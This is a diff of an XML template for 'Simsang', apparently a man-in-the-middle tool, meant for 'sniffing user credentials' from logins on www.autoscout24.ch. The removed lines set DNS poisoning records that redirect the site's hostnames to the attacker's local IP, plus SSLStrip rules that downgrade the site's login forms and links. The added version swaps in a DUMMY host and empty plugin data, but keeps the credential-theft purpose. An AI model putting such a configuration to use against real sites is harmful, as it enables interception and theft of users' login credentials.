@@ -1,74 +1,38 @@
-<SessionTemplate>
+<SimsangTemplate>
 
-  <Config>
-    <Name>www.autoscout24.ch user login</Name>
+  <TemplateConfig>
+    <Name>Autoscout24 user login</Name>
     <Description>Sniffing user credentials from login attempt on www.autoscout24.ch</Description>
     <Timestamp>2016-02-27</Timestamp>
     <Version>0.2</Version>
     <Author>Simsang</Author>
     <Reference>http://buglist.io/ </Reference>
-  </Config>
+  </TemplateConfig>
 
-  </Hops>
+  <Hops>
     <Hop>
-      <Host>GET http://www.autoscout24.ch</Host>
+      <Host>GET http://DUMMY</Host>
       <Description>User typed URL in browser</Description>
-    </Hop> 
-    <Hop>  
-      <Host>GET https://www.autoscout24.ch</Host>
-      <Description>User clicked on login link</Description>
-    </Hop> 
-    <Hop>  
-      <Host>POST https://www.autoscout24.ch</Host>
-      <Description>User clicked on login link</Description>
-    </Hop> 
-  </Hops>
-      
-<Plugins>
-<Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+    </Hop>
+  </Hops>  
 
-<ArrayOfDNSPoisonRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-  <DNSPoisonRecord>
-    <HostName>www.autoscout24.ch</HostName>
-    <IPAddress>@LOCALIP</IPAddress>
-  </DNSPoisonRecord>
-  <DNSPoisonRecord>
-    <HostName>autoscout24.ch</HostName>
-    <IPAddress>@LOCALIP</IPAddress>
-  </DNSPoisonRecord>
-</ArrayOfDNSPoisonRecord>
-</Plugin>
-<Plugin name="HTTP accounts" dirname="HTTPAccounts">
+  <Plugins>
 
-<PluginData xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-  <Records />
-</PluginData>
-</Plugin>
-<Plugin name="SSLStrip" dirname="SSLStrip">
+    <Plugin>
+      <Name>DNS Poisoning</Name>
+      <Data></Data>
+    </Plugin>
 
-<ArrayOfSSLStripRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-  <SSLStripRecord>
-    <HostName>www.autoscout24.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>form</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>www.autoscout24.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>a</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>autoscout24.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>a</Tag>
-  </SSLStripRecord>
-  <SSLStripRecord>
-    <HostName>autoscout24.ch</HostName>
-    <ContentType>text/html</ContentType>
-    <Tag>form</Tag>
-  </SSLStripRecord>
-</ArrayOfSSLStripRecord>
-</Plugin>
+    <Plugin>
+      <Name>HTTP accounts</Name>
+      <Data></Data>
+    </Plugin>
 
-</Plugins>
-</SessionTemplate>
+    <Plugin>
+      <Name>SSLStrip</Name>
+      <Data></Data>
+    </Plugin>
+
+  </Plugins>
+</SimsangTemplate>
+
